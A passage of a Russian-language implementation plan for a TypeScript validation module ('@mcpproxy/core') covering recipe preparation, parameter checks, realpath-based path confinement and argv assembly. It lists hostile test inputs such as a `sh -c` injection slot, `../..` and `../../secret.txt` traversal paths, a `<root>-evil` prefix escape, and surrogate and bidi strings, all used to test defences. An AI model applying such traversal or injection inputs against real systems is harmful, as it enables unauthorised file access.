   и записи аудита. Прецедента в доках у него нет: родственный `JCS_MAX_DEPTH` ограничивает глубину вложенности, а не длину, и это другой класс. Ограничение вводится здесь впервые.

**Falsification:** зачистка стоит только на `reason` → отказ, построенный с
`paramName: 'a\uD800'`, даёт объект, на котором `canonicalizeJcs` бросает `TypeError`, то
есть отказ, который E4 не сможет записать; зачистка на обоих полях → тот же вызов проходит.
Утверждается `expect(() => canonicalizeJcs({ d: denial({...}) })).not.toThrow()` на **всём
объекте отказа**, а не на отдельном поле: трейс на одном поле зелен при дефекте в соседнем.

Вторая: убрать `sanitizeDescription`, оставив только зачистку суррогатов → отказ с bidi-RLO
в `reason` проносит `\p{Cf}` до UI, и `expect(/\p{Cf}/u.test(d.reason)).toBe(false)` краснеет.
Симметрично третья: убрать зачистку суррогатов, оставив `sanitizeDescription` → краснеет
утверждение про `canonicalizeJcs`. Две мутации доказывают, что нужны обе зачистки; одна
мутация доказала бы только одну.

Четвёртая, на `isCanonicalizable`: для набора из ~20 строк (обычные, обе половины суррогата,
корректная пара, нулевой байт, bidi, пустая) предикат обязан совпадать с фактическим
поведением `canonicalizeJcs` в `try/catch`. Расхождение — красный тест. Без этого предикат
и канонизатор разъезжаются молча, и гейт R28 становится декоративным.

**Типовые трейсы — форма, на которую ссылаются задачи 3, 7 и 9.** Утверждения уровня типа
в этом плане бывают двух разных видов, и путать их нельзя:

- **исчерпанность** — «в юнионе нет члена, которого нет в списке». Идиом уже есть в
  `packages/contracts/src/domain.test.ts:29`: `Exclude<…>` плюс присваивание, роняющее сборку.
  Именно он и только он берётся из контрактов.
- **отсутствие поля** — «у ветки результата нет `argv`», «у ветки `string` нет `schema`».
  `Exclude`-идиом это не выражает, и переносить его сюда как есть значит написать no-op.
  Форма другая: присваивание объектного литерала с лишним ключом переменной точного типа
  ветки — избыточное свойство даёт ошибку компиляции. Плюс `Exclude<keyof Ветка, 'ожидаемые' |
  'ключи'>` обязан быть `never`.

Обе формы проверяются одинаково: тест «работает» только если удаление правила ломает **сборку**,
а не прогон. Поэтому каждый такой трейс сопровождается однократной ручной мутацией с записью
результата — типовой тест, который ничего не запрещает, компилируется молча и выглядит как
зелёный.

**Runtime:** node, чистые функции, часов нет.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: общие типы, словарь отказов и предикат канонизируемости`

---

### Задача 3 — подготовка рецепта

Реализует R2, R3, R4, R18, R22 (половина — `exec`/`cwd`), R28 (источник 3).

**Files:**
- Create: `packages/core/src/validate/prepare.ts`
- Create: `packages/core/src/validate/prepare.test.ts`

**Interfaces:**

```ts
export type PreparedParam =
  | { readonly kind: 'string'; readonly name: string; readonly required: boolean; readonly argv: readonly string[]; readonly matcher: PatternMatcher; readonly maxLength: number | null }
  | { readonly kind: 'enum'; readonly name: string; readonly required: boolean; readonly argv: readonly string[]; readonly values: readonly string[] }
  | { readonly kind: 'number'; readonly name: string; readonly required: boolean; readonly argv: readonly string[]; readonly min: number | null; readonly max: number | null; readonly integer: boolean }
  | { readonly kind: 'boolean'; readonly name: string; readonly required: boolean; readonly argv: readonly string[] }
  | { readonly kind: 'path'; readonly name: string; readonly required: boolean; readonly argv: readonly string[]; readonly root: string };

export interface PreparedRecipe {
  readonly recipeName: RecipeName;
  readonly params: readonly PreparedParam[];
  readonly cwd: string;
  readonly exec: readonly string[];
}

export type PrepareResult =
  | { ok: true; prepared: PreparedRecipe }
  | { ok: false; problems: readonly string[] };

export function prepareRecipe(
  recipeName: RecipeName,
  recipe: Recipe,
  matchers: ReadonlyMap<string, PatternMatcher>,
  manifestDir: string,
): PrepareResult;
```

**Шаги:**

1. Обойти `recipe.params` в порядке объявления. Порядок берётся из `Object.entries` того же
   объекта, который лёг в нормализованную форму: порядок параметров входит в форму именно
   потому, что из него собирается argv (`docs/adr/0006-manifest-lockfile.md:29`).
2. Для параметра `type: 'string'` взять матчер как `matchers.get(matcherKey(recipeName, name))`.
   Ключ строится вызовом `matcherKey`, `packages/contracts/src/types.ts:114`, а не конкатенацией.
3. Матчер отсутствует у `string`-параметра → `{ ok: false }` с внятной проблемой. Это **не**
   пер-вызовная развилка (R4).
4. **`PreparedParam` — замкнутая форма.** Из схемы переносится только то, что нужно проверке:
   матчер, `maxLength`, `values`, границы, резолвнутый `root`, шаблон `argv`. Поля
   `schema: StringParam` в ней нет, и это структурная часть R3: `StringParam.pattern` —
   недоверенная строка, ради недоступности которой существует `PatternMatcher`
   (`packages/contracts/src/types.ts:95`), и положить её в горячую структуру значит оставить
   `new RegExp(param.schema.pattern)` на расстоянии одного нажатия. План отказывает матчеру в
   праве быть `| null`, чтобы не открыть развилку, — класть рядом запасной путь для той же
   развилки было бы непоследовательно.
5. Ветка `string` несёт `matcher: PatternMatcher` — **не** `PatternMatcher | null`. Тип обязан
   выражать то, что гарантирует шаг 3: иначе `validateParams` не скомпилируется без второй
   проверки, а второй проверкой будет либо запрещённая R4 развилка, либо `matcher!`.
6. Ветка `path` несёт **только** резолвнутый `root` — лексически, относительно `manifestDir`.
   Сырого `schema.root` рядом нет по тому же доводу, по которому R18 запрещает два поля `cwd`:
   два поля с одним смыслом, одно проверенное, другое нет, — это приглашение взять не то.
7. Отсутствующий шаблон `argv` нормализуется здесь в `[]`. `argv?: ArgvTemplate` необязателен
   у всех пяти типов; закрыв ветку один раз на подготовке, задача 6 избавляется от неё совсем.
8. `cwd` вычисляется здесь и только здесь — единственный владелец (R18). Отсутствующий `cwd`
   рецепта даёт `manifestDir`.
9. **Собственная перепроверка инвариантов, а не доверие загрузке.** `prepareRecipe` принимает
   голый `Recipe`, а `docs/07-contracts.md:161` прямым текстом объясняет, почему пол и потолок
   держатся в двух местах: «потребитель, собравший `Recipe` программно, минует загрузчик
   вместе со всеми его диагностиками». Поэтому здесь проверяются: `root !== resolve('/')`,
   **относительный `root` не выходит за `manifestDir`**, отсутствие слота `{}` в `exec` и в
   `cwd`, и **не более одного слота `{}` на элемент шаблона `argv`**. Это R22 в исполнении —
   тест на чужой инвариант проверял бы чужой код, а не поведение нашего на нарушенном входе.

   Счёт слотов стоит именно здесь, а не в `buildArgv`, по форме отказа: подготовка умеет
   вернуть `problems`, а `buildArgv` тотальна и может только бросить — то есть нарушение на
   третьей стадии дало бы вызов без `CallResult` и отказ, который E4 нечем записать. Плюс это
   once-per-load, то есть бесплатно на горячем пути.

   Второе правило нельзя опускать, взяв только первое: они стоят рядом в
   `packages/contracts/src/validate/refine.ts:213` и `:223` как две половины одной проверки, и
   программный `Recipe` с `root: '../..'` проходит первую и выходит за каталог манифеста —
   ровно тот случай «минует загрузчик», ради которого весь шаг и существует.
9а. **Канонизируемость строк, пришедших из рецепта** (R28, источник 3): `exec`, `cwd`, `root`,
   элементы шаблонов `argv`, значения `enum`, а также **имена параметров** и **`recipeName`**
   прогоняются через `isCanonicalizable`.

   Последние два — не педантизм, а замер: `canonicalizeJcs` бросает и на суррогате в **ключе**
   объекта, не только в значении (Ф16). Имена параметров становятся ключами карты `values`,
   которая через `Object.fromEntries` превращается в `params`, а `recipeName` уезжает в
   `argsHash` первым аргументом — то есть оба доходят до того же стока, что и значения, и дают
   тот же исход: разрешённый вызов, событие которого записать нельзя. Непригодное — запись в
   `problems`, то есть отказ подготовки. Основание ровно то же, что у шага 9, и по тому же
   доводу: загрузчик гарантирует хэшируемость манифеста, но программно собранный `Recipe`
   загрузчик минует, а `exec` и `cwd` едут прямо в argv и в `CallResult`. Это once-per-load,
   то есть бесплатно на горячем пути, и отказывает в безопасную сторону.
10. `recipeName` типизирован брендированным `RecipeName` из `packages/contracts/src/ipc.ts`,
    а не голым `string`: бренд существует ровно затем, чтобы перестановка двух строк на этой
    границе была ошибкой компиляции.
11. `problems` — текст для человека, ветвиться по нему нельзя. Причин сейчас немного; если
    станет много, вводится код, как в `DiagnosticCode` и `DenialCode`.

**Falsification:** проверка из шага 3 отсутствует → `prepareRecipe` с пустой картой матчеров
возвращает `ok: true`; проверка есть → тот же вызов даёт `ok: false`. Утверждается
`result.ok === false`, а не текст проблемы.

Вторая, на шаг 9 — **по вектору на каждый из четырёх инвариантов**, а не два из четырёх:
правило «один вектор зелен при отсутствии другой проверки» само же их и порождает.

| Вектор | Без проверки | С проверкой |
|---|---|---|
| `exec: ['sh', '-c', '{}']` | `ok: true`, слот доезжает до `exec` — R22 нарушен буквально | `ok: false` |
| `root: '/'` | `ok: true`, confinement не ограничивает ничего | `ok: false` |
| `root: '../..'` | `ok: true`, корень уходит за каталог манифеста | `ok: false` |
| `argv: ['--x={}{}']` | `ok: true`, а бросок случается позже, на третьей стадии — вызов без `CallResult` | `ok: false` |

Третья, на шаг 9а: `Recipe`, у которого `exec[0]` содержит одиночный суррогат. Без проверки
подготовка проходит, значение доезжает до argv, и `chainHash` бросает на **разрешённом**
вызове; с проверкой — `ok: false`. Вектор берётся именно на `exec`, а не на значении
параметра: гейт значений живёт в задаче 4 и этот путь не покрывает.

Третья, на шаги 4 и 5, — уровня типа: выражение перестаёт компилироваться, если ветка
`string` снова получает `| null` или поле `schema`. Форма — формой, названной в задаче 2 (см. «типовые трейсы» в задаче 2). Без него замкнутость формы существует только
на словах: рантайм-тест зелен и с лишним полем.

**Runtime:** node. `manifestDir` в тестах — литерал `/home/u/proj`, файловая система не
трогается: резолв `cwd` и `root` здесь лексический, `realpath` живёт в задаче 5.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: подготовка рецепта — замкнутая форма, матчер один раз, свои инварианты`

---

### Задача 4 — валидация параметров

Реализует R6, R7, R8, R9, R10, R11, R12, R25, R28 (источник 1), R29, R30, R30а.

**Files:**
- Create: `packages/core/src/validate/params.ts`
- Create: `packages/core/src/validate/params.test.ts`

**Interfaces:**

```ts
export type ValidateParamsResult =
  | { ok: true; values: ValidatedValues }
  | { ok: false; denials: readonly [Denial, ...Denial[]] };

export function validateParams(
  prepared: PreparedRecipe,
  params: Readonly<Record<string, unknown>>,
): ValidateParamsResult;
```

**Шаги:**

1. **Гейт формы контейнера, до всего остального** (R29):
   `typeof params === 'object' && params !== null && !Array.isArray(params)`. Не проходит →
   единственный отказ `bad-params-container` с `paramName: null`. Замерено:
   `Object.keys(null)` бросает `TypeError` (Ф13), а это крэш на границе доверия, то есть
   отказ без следа в аудите. `IpcRequest.params` — тип, а не рантайм-гарантия: по сокету
   приходит произвольный JSON.
2. Неизвестные ключи: `Object.keys(params)` минус имена из `prepared.params`, на каждый
   остаток — `unknown-param`. Принадлежность проверяется `Object.hasOwn`, чтобы `constructor`
   из запроса не читался с прототипа (R6). Список отказов **сортируется по имени**: иначе его
   порядок задаёт атакующий порядком ключей в своём JSON, а этот порядок доезжает до
   `denyReason` и внутрь `chain.self`.
2а. **Потолок на сам список** (R30а): не больше `DENIALS_MAX` отказов, дальше — один
   суммирующий с кодом `denials-truncated` и общим числом в `reason`. Код собственный, а не
   переиспользованный `unknown-param`: иначе двусторонняя перепись задачи 8 не смогла бы
   отличить «усечение произошло» от «был один неизвестный ключ», и потолок стал бы
   непроверяемым. И `paramName` усекается по `VALUE_MAX_CODE_POINTS`. Без этого
   запрос со ста тысячами ключей даёт сто тысяч отказов, каждый через две зачистки, и E4
   обязан сериализовать их в append-only лог. `IpcRequest` потолка размера не несёт, а полный
   контроль над сокетом входит в модель угроз; имена параметров манифеста ограничены схемой,
   ключи запроса — нет.
3. Для каждого объявленного параметра: отсутствует и `required` → `missing-required`;
   отсутствует и необязателен → пропуск без значения.
4. Гейты на строковое значение стоят **внутри** функции своего типа, после её проверки
   `typeof` и до её ограничений, и в таком порядке: сначала длина
   (`[...value].length > VALUE_MAX_CODE_POINTS` → `value-oversized`), потом канонизируемость
   (`isCanonicalizable` → `not-canonicalizable`), потом `pattern`/`values`.

   Порядок несущий по трём причинам. Длина раньше канонизируемости — иначе строка в сто
   мегабайт целиком сканируется на суррогаты, прежде чем быть отвергнутой за размер. Обе
   раньше `pattern` — это и есть закрытие Ф12: `^.{0,64}$` законный паттерн, пропускающий
   одиночный суррогат, и вердикт не должен зависеть от того, насколько строг автор манифеста.
   И обе **внутри** функции типа, а не отдельным проходом до диспетчеризации, — иначе
   `number`-параметру, которому передали пятитысячесимвольную строку, вернётся
   `value-oversized` вместо `wrong-type`, что противоречит R8 и ломает перепись «код ↔ вектор»
   задачи 8.
5. Дальше — **одна** диспетчеризация по `param.kind`, функция на тип: `checkString`,
   `checkEnum`, `checkNumber`, `checkBoolean`, `checkPath`. Форма из
   `packages/contracts/src/validate/refine.ts`, где каждая проверка — отдельная функция с
   именем `check*`. Каждая владеет и своим гейтом типа, и своими ограничениями; R8 («тип до
   ограничений») становится инвариантом внутри функции, а не отдельным проходом. Второго
   ветвления по типу нет: два места, отвечающие за `wrong-type`, разъезжаются молча.
6. `checkString`, полная последовательность: `typeof === 'string'`, иначе `wrong-type`;
   `[...value].length > VALUE_MAX_CODE_POINTS` → `value-oversized`;
   `isCanonicalizable` → `not-canonicalizable`;
   `[...value].length > maxLength` → `too-long`;
   `matcher.test` → `pattern-mismatch`.
   Счёт по кодовым точкам, а не по `length`: замерено, для эмодзи 3 против 4 (Ф11).
   Порядок именно этот — `matcher.test` **последним**, а не сразу после гейта типа: паттерн
   автора манифеста не должен решать судьбу отравленного значения (Ф12).
7. `checkEnum`, полная последовательность: `typeof === 'string'`, иначе `wrong-type`;
   потолок → `value-oversized`; канонизируемость → `not-canonicalizable`;
   `values.includes` → `not-in-enum`.
8. `checkNumber`: `typeof === 'number'`, иначе `wrong-type`; `Number.isFinite` → `not-finite`
   (JSON выражает `1e400`, и `JSON.parse` даёт `Infinity`); `min`/`max` → `out-of-range`;
   `integer && !Number.isInteger` → `not-integer`.
9. `checkBoolean`: `typeof === 'boolean'`, иначе `wrong-type`. Строка `"true"` не принимается.
10. `checkPath`, полная последовательность: `typeof === 'string'`, иначе `wrong-type`;
    потолок → `value-oversized`; канонизируемость → `not-canonicalizable`. Резолва здесь нет —
    значение уходит в задачу 5.

    Здесь оба гейта наиболее нужны, а не наименее: `PathParam` не имеет **ни** `pattern`,
    **ни** `maxLength` — это и есть весь мотив R30. Пропустив их в этой функции, мы оставили бы
    без потолка ровно тот тип, ради которого потолок вводился, и путь в мегабайт доехал бы до
    `realpath`, argv, `argsHash` и до текста отказа в append-only логе.
11. `null`, массив и объект не проходят ни один гейт типа: `typeof null === 'object'`,
    `typeof [] === 'object'`. Отдельной ветки под них не нужно, и тест это фиксирует, чтобы
    утверждение не держалось на рассуждении.
12. Ни одна ветка не кладёт `value` в `reason` (R25). Текст называет имя, тип и ограничение.

**Falsification:** отсеивание неизвестных ключей отсутствует → вызов с
`{ pattern: 'ok', evil: 1 }` даёт `ok: true`, и `values` содержит только `pattern`, то есть
лишний ключ проехал молча; отсеивание есть → `ok: false` с кодом `unknown-param`.
Утверждается `denials.map((d) => d.code)` равным `['unknown-param']`, а не длина массива:
длина совпала бы и при любом другом коде.

На R25: вызов с приметным значением `'ZZmarkerZZ'`, утверждение
`expect(denials.map((d) => d.reason).join()).not.toContain('ZZmarker')`. Без правила эта
подстрока присутствует. Трейс относится только к стадии `validate` — на `resolve_paths`
резолвнутый путь показывается осознанно (R26), и там этот трейс неприменим по построению.

На R28 — главный: рецепт с законным паттерном `^.{0,64}$` и значением с одиночным
суррогатом. Гейта нет → `ok: true`, значение попадает в `values`, и
`canonicalizeJcs({ v: values.get('p') })` бросает; гейт есть → `ok: false` с кодом
`not-canonicalizable`. Утверждается пара «код отказа» и «канонизация успешного результата не
бросает», потому что каждое по отдельности зелено при половинчатой правке.

На R29: `validateCall`-уровневые входы `null`, `[]`, `'str'`, `42`. Гейта нет → `null`
бросает `TypeError`, а `[]`/`'str'`/`42` дают неверный, но не падающий результат
(`Object.keys('x')` = `['0']`); гейт есть → все четыре дают `bad-params-container`.
Четыре входа, а не один: бросает только `null`, и трейс на одном `null` пропустил бы три.

На R30 — по вектору на каждый тип, принимающий строку, потому что потолок живёт в трёх
функциях независимо: строка длиной `VALUE_MAX_CODE_POINTS + 1` для `string`, для `enum` и
для `path`. Потолка нет в `checkPath` → его вектор даёт `ok: true` и мегабайтное значение
уезжает в задачу 5; есть → `value-oversized`. Общий трейс на одном `string`-параметре
пропустил бы ровно тот тип, ради которого R30 и написан.

На R30а: запрос с `DENIALS_MAX + 50` неизвестными ключами. Потолка нет → длина списка равна
числу ключей; есть → не больше `DENIALS_MAX + 1`, и последний отказ несёт общее число.
Плюс ключ длиной больше `VALUE_MAX_CODE_POINTS` даёт усечённый `paramName`. Утверждается
длина списка и длина имени, а не только «отказ есть».

**Runtime:** node, чистые функции.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: валидация параметров — контейнер, канонизируемость, потолок, диспетчер по типу`

---

### Задача 5 — резолв путей и confinement

Реализует R13, R14, R15, R15а, R16, R17, R26, R28 (источник 2).

**Files:**
- Create: `packages/core/src/validate/paths.ts`
- Create: `packages/core/src/validate/paths.test.ts`

**Interfaces:**

```ts
export type ResolvePathsResult =
  | { ok: true; values: ResolvedValues }
  | { ok: false; denials: readonly [Denial, ...Denial[]] };

export function resolvePaths(
  prepared: PreparedRecipe,
  values: ValidatedValues,
): ResolvePathsResult;
```

**Шаги:**

1. Для каждого `kind: 'path'` взять значение. Параметр необязателен и не передан →
   пропуск: `values.get(name)` даёт `undefined`, и без этой ветки `path.resolve(root, undefined)`
   бросает. Значение не строка → `path-unusable`; ветка недостижима после задачи 4, но
   названа, иначе будет закрыта через `as string`. Замерено: `path.resolve(root, 42)` бросает
   `ERR_INVALID_ARG_TYPE` (Ф13).
2. **`realpathSync` над `param.root` — первым** (Ф4). Не резолвится → `path-unusable`.
   Порядок здесь несущий: обе последующие проверки сравнивают с корнем, и сравнивать с
   нерезолвнутым нельзя (Ф14).
3. **Лексическая предпроверка — советующая** (R15а): собрать `cand = resolve(realRoot, value)`
   и прогнать через предикат §7. Результат запоминается в булеву `preOk` и **на этом всё**:
   вызов здесь не отвергается ни при каком исходе.

   Запрещающей она быть не может, и это замерено в обе стороны (Ф14, Ф16). Против
   лексического корня она отвергает законное значение в realpath-форме; против резолвнутого —
   законное значение в той форме, в какой корень объявлен в манифесте. И общий случай хуже
   обоих частных: **любой** законный файл внутри `root`, достигнутый через симлинк,
   отвергается лексическим предикатом, потому что лексический предикат симлинков не видит —
   ровно поэтому существует И3. Мой прошлый фикс переставил дефект, а не убрал его.
4. `realpathSync` над кандидатом, **независимо от `preOk`**. Провал:
   `preOk === false` → `path-escapes-root`; иначе `ENOENT` → `path-not-found` (R16, Ф1),
   любой другой код → `path-unusable` (Ф10). Ловится `error.code`, а не текст.
5. Предикат §7 над результатом `realpath`, против `realRoot` (R13). Не прошло →
   `path-escapes-root`. **Это единственное место, где вызов отвергается по границе**, и
   единственное, которое ловит симлинк.

   Оракул при этом схлопнут ровно там, где он был опасен: обход с существующей целью и обход
   с несуществующей получают из шагов 4–5 один и тот же код `path-escapes-root` (Ф16). Внутри
   `root` различие «файл есть» / «файла нет» остаётся, и это записано в ограничениях спеки.
6. **Гейт канонизируемости над результатом `realpath`** (R28, источник 2). Не прошло →
   `not-canonicalizable`. Гейт задачи 4 сюда не дотягивается: `realpath` **заменяет**
   проверенный вход новой строкой, собранной из имён на диске. То, что на macOS имена — UTF-8
   и суррогата там быть не может, — свойство платформы, а не гарантия E2.
7. **Одна карта на выходе.** Резолвнутый путь кладётся в неё ровно в том виде, в каком его
   вернул `realpath` — нормализации нет нигде (R17). Прежняя двухкарточная форма отменена
   вместе с NFC: она существовала только чтобы развести argv и `argsHash`, а разводить больше
   нечего. Значения не-`path` параметров переносятся без изменений.
8. `cwd` здесь не вычисляется — его единственный владелец задача 3 (R18).
9. Резолвнутый путь и граница confinement нужны тексту отказа (R26), поэтому существуют как
   локальные значения внутри стадии и уходят в `reason` через конструктор `denial`, который
   их санитизирует. Замерено: `realpath` возвращает имя дословно, включая bidi (Ф13), и файл
   с таким именем внутри `root` создать можно.
10. Какая строка попадает в текст отказа. Шаг 3 отказов не производит вовсе, поэтому вариантов
    два: отказ шага 4 (резолв не удался) называет **границу** и факт нерезолвимости —
    резолвнутого пути не существует; отказ шага 5 (резолв удался, граница нарушена) называет
    **результат `realpath`**, то есть то, куда вызов на самом деле указывал.

    Второе — то, что показывает S4, и то, ради чего R26 делает исключение из R25. Плата
    записана в ограничениях спеки: для целей под симлинком текст различает существующую и
    несуществующую цель даже там, где код одинаков.
11. `realpath` корня делается на каждый вызов, а не кэшируется в подготовке, и это
    сознательно: корень мог быть подменён на симлинк после загрузки манифеста, а кэш сделал бы
    подмену невидимой. Цена — один сисколл на параметр; R2 говорит «не делать того, что можно
    сделать один раз», и здесь как раз нельзя.

**Falsification:** четыре отдельные, потому что четыре независимых дефекта дают один зелёный:

- realpath отсутствует (проверка только лексическая) → тест с симлинком на каталог, через
  который идёт обход, даёт `ok: true`; realpath есть → `ok: false` с `path-escapes-root`.
  Утверждается код, не `ok`.
- confinement на `startsWith` вместо `relative` → тест с соседом `<root>-evil/a` даёт
  `ok: true`; на `relative` → `ok: false`.
- `root` не резолвится сам → на macOS, где временный каталог лежит под симлинком `/var`,
  **любой** путь даёт `path-escapes-root`, включая законный; резолвится → законный проходит.
  Фикстура создаётся через `mkdtempSync(join(tmpdir(), ...))` намеренно, и утверждение
  `root !== realpathSync(root)` стоит в тесте первым, чтобы дефект фикстуры не читался как
  успех. На платформе, где `tmpdir` не под симлинком, этот `it` честно покажет невыполненную
  предпосылку вместо того, чтобы молча ослабить остальные.
- лексической предпроверки нет → вектор `../../secret.txt`, **цель которого создана**, даёт
  `path-escapes-root` и без неё, но вектор `../../nonexistent` даёт `path-not-found`, то есть
  различимость сохраняется; предпроверка есть → оба дают `path-escapes-root`. Утверждается
  равенство кодов у существующей и несуществующей цели — именно это и есть схлопывание оракула.

Пятая — **три формы одного законного пути**, и все три обязаны быть приняты, потому что
каждая ловит свой вариант дефекта предпроверки: относительная (`a.log`), лексическая
(`<lexRoot>/a.log`, форма из манифеста) и через симлинк-каталог внутрь `root`. Предпроверка
запрещающая против резолвнутого корня → отказ на второй и третьей; против лексического →
отказ на форме из `realpath`; советующая → приняты все. Замерено (Ф14, Ф16).

Именно отсутствие второй и третьей формы позволило прошлому раунду «починить» дефект
перестановкой: все прежние трейсы подавали относительное значение, а оно round-trip'ится при
любом варианте предпроверки.

Шестая, на схлопывание оракула: обход с **созданной** целью и обход с несуществующей целью
дают один и тот же код. Предпроверка убрана совсем → коды различаются (`path-escapes-root`
против `path-not-found`), и бит о существовании уходит наружу; советующая → оба
`path-escapes-root`. Утверждается равенство кодов, а не их значение.

Седьмая, на R17: файл создаётся под NFD-именем и запрашивается под NFD — строка в результате
обязана быть байт в байт той, что вернул `realpath`. Плюс: `argsHash` от относительного и от
абсолютного написания одного файла совпадает (это даёт `realpath`), а от NFC- и NFD-пути —
**различается**, потому что это разные пути. Нормализация где-нибудь в цепочке роняет второе
утверждение.

**Runtime:** node, настоящая файловая система. Каталог — `mkdtempSync(join(tmpdir(), 'e2-'))`,
удаляется в конце; фиксированных путей и фиксированных портов нет.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: резолв путей — realpath корня, советующая предпроверка, confinement`

---

### Задача 6 — сборка argv

Реализует R19, R20, R21, R22.

**Files:**
- Create: `packages/core/src/validate/argv.ts`
- Create: `packages/core/src/validate/argv.test.ts`

**Interfaces:**

```ts
export function buildArgv(
  prepared: PreparedRecipe,
  values: ResolvedValues,
): readonly string[];
```

**Шаги:**

1. Начать с `prepared.exec` целиком. В `exec` **ничего не подставляется** — ни одного вызова
   замены над его элементами (R22).
2. Обойти `prepared.params` **в порядке объявления** (R19).
3. Отсутствующее значение не даёт элементов. Шаблон `argv` уже нормализован задачей 3 в `[]`,
   поэтому ветки «шаблона нет» здесь не существует.
4. `boolean`: значение `true` добавляет элементы шаблона как есть, `false` не добавляет ничего
   (R21). Подстановки нет — у `boolean` слот не раскрывается.
5. Остальные типы: каждый элемент шаблона — отдельный элемент результата; элемент, содержащий
   `{}`, отдаёт результат замены `{}` на строковое представление значения (R20). Для `path`
   в карте лежит результат `realpath` — задача 5 вернула ровно одну карту и заменила значение
   в ней, так что второго источника, из которого можно было бы взять сырую строку или
   нормализованную форму, здесь физически нет.
6. Строковое представление задаётся **явной функцией**, а не `String(value)`: замерено, что
   `String(1e21)` даёт `'1e+21'` (Ф13), то есть скрипт получил бы экспоненциальную запись
   вместо числа. Функция и её поведение на `1e21`, `-0` и `0.1 + 0.2` фиксируются тестом.
7. **Подстановка не интерпретирует подставляемое** (R20а). Реализация — `split('{}').join(v)`
   либо `replace('{}', () => v)`; `replace('{}', v)` со строковой заменой **запрещён** и назван
   здесь именно потому, что он и есть очевидный первый вариант.

   Замерено (Ф17): `String.replace` трактует `$&`, `` $` ``, `$'` и `$$` в замене. Существующий
   файл `a$'b.log`, прошедший confinement, наивной подстановкой даёт argv с путём `ab.log` —
   другим и несуществующим. Это ломает корректность на законном имени, а не только даёт вектор:
   argv перестаёт равняться проверенной строке, `argsHash` считается по одной, а процесс
   открывает другую.
8. Проверка «не более одного слота на элемент» **сюда не входит** — она переехала в задачу 3,
   шаг 9. Причина в форме отказа: `buildArgv` тотальна и отказать не умеет, поэтому нарушение
   здесь могло бы только бросить, а бросок на третьей стадии — это вызов без `CallResult`,
   то есть отказ, который E4 нечем записать. Ровно тот класс, ради которого написан R29.
   Здесь остаётся ассерт как избыточная страховка, и он обязан быть **недостижим**.
9. `buildArgv` тотальна: всё, что могло не пройти, до этой стадии не дошло. Поэтому
   `build_argv` отсутствует в `DenialStage`.

**Falsification:** склейка вместо элементов → тест с `argv: ['--flag', '{}']` и значением
`a b` даёт argv длины 1 после `exec`, и `argv.at(-1)` равен `'--flag a b'`; поэлементная
сборка → длина 2, `argv.at(-2) === '--flag'` и `argv.at(-1) === 'a b'`. Утверждаются оба
элемента по отдельности, а не `join(' ')`: склеенная строка и правильная пара дают одинаковый
`join`, и трейс, написанный на `join`, не сработал бы ни при какой мутации.

На R19: два параметра, объявленные в порядке `zebra`, `alpha` — алфавитный порядок
**противоположен** порядку объявления, поэтому обход по отсортированным ключам или по вставке
в `Map` не совпал бы случайно. Утверждается позиция каждого.

На R22: самодельный `Recipe` с `exec: ['sh', '-c', '{}']` — `buildArgv` обязан вернуть `exec`
дословно, со слотом, не подставив в него значение. Без шага 1 значение оказывается внутри
`exec[2]`, и это буквально то, что запрещает И2.

На R20а — вектор с законным именем, а не с атакующим: файл `a$'b.log` создаётся в фикстуре,
проходит confinement, и утверждается, что `argv.at(-1)` **равен** его резолвнутому пути байт
в байт. С наивным `replace` argv несёт `ab.log`, и утверждение краснеет. Второй вектор —
`` a$`b.log `` с шаблоном `--file={}`: наивная подстановка вклеивает в значение сам префикс
`--file=`. Оба вектора нужны: `$'` и `` $` `` портят строку по-разному, и трейс на одном
пропустил бы другой.

**Runtime:** node, чистые функции.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: сборка argv — порядок объявления, элементы, ничего в exec`

---

### Задача 7 — фасад стадий и измерение длительности

Реализует R2, R23, R31.

**Files:**
- Create: `packages/core/src/validate/index.ts`
- Create: `packages/core/src/validate/index.test.ts`

**Interfaces:**

```ts
export interface StageTiming {
  readonly stage: E2Stage;
  readonly durationUs: number;
}

export type CallResult =
  | {
      ok: true;
      argv: readonly string[];
      cwd: string;
      params: Readonly<Record<string, ParamValue>>;
      timings: readonly StageTiming[];
    }
  | {
      ok: false;
      denials: readonly [Denial, ...Denial[]];
      cwd?: string;
      timings: readonly StageTiming[];
    };

export function validateCall(
  prepared: PreparedRecipe,
  params: Readonly<Record<string, unknown>>,
): CallResult;
```

**Шаги:**

1. Прогнать три стадии по порядку, измеряя каждую через `process.hrtime.bigint()` и приводя
   к целым микросекундам. Помощника для этого в контрактах нет — единственное упоминание
   `hrtime` там внутри теста. Проводка явная и однозначная:
   `const v = validateParams(prepared, params)` → `const r = resolvePaths(prepared, v.values)`
   → `buildArgv(prepared, r.values)`. Два **разных** имени для двух разных результатов, и два
   разных типа: `v.values` это `ValidatedValues`, `r.values` — `ResolvedValues`. Передать в
   `buildArgv` дорезолвную карту — то есть сырую строку пользователя прямо в argv — теперь
   ошибка компиляции, а не то, что ловит один рантайм-трейс.
2. Остановка на первой стадии, давшей отказ. `timings` содержит стадии, которые успели
   выполниться, включая отказавшую: событие пишется на каждой стадии, включая отказ, и E4 не
   может написать то, чего ему не отдали.
3. Отказы стадии передаются наружу **все**, непустым кортежем. Задача 4 намеренно собирает
   `unknown-param` на каждый лишний ключ; схлопывание до одного показало бы человеку один
   отказ из пяти. Кортеж `[Denial, ...Denial[]]` вместо массива — чтобы ветка отказа не могла
   оказаться пустой.
4. **Успех отдаёт `params`** — единственную карту из задачи 5, уже как обычный объект
   (`Object.fromEntries`), чтобы шов E4 не имел развилки (R31). Без этого `argsHash` считать
   не из чего: контракт требует значения **после** валидации и резолва
   (`packages/contracts/src/audit/args.ts:9`), и без них `{file: './logs/a.log'}` и
   `{file: '/abs/logs/a.log'}` перестают быть одним вызовом. Именно `realpath` делает их одним;
   нормализации в цепочке нет (R17).
5. `argv` есть только в успехе — форма, из которой E4 не может собрать `argv: []`
   (`packages/contracts/src/event.ts:89`).
6. `cwd` присутствует, если стадия `resolve_paths` была достигнута, в том числе при отказе на
   ней: контракт говорит, что `cwd` впервые появляется именно на этой стадии, и вызов,
   отказавший здесь, свой `cwd` уже знает. Спрятав его, мы отняли бы у S4 предмет
   демонстрации: границу confinement показывают относительно рабочего каталога.
   При отказе на `validate` ключ **отсутствует**, а не равен `null` — форма ставится условным
   спредом. Это не стиль: `packages/contracts/src/event.ts:90` объявляет `readonly cwd?: string`
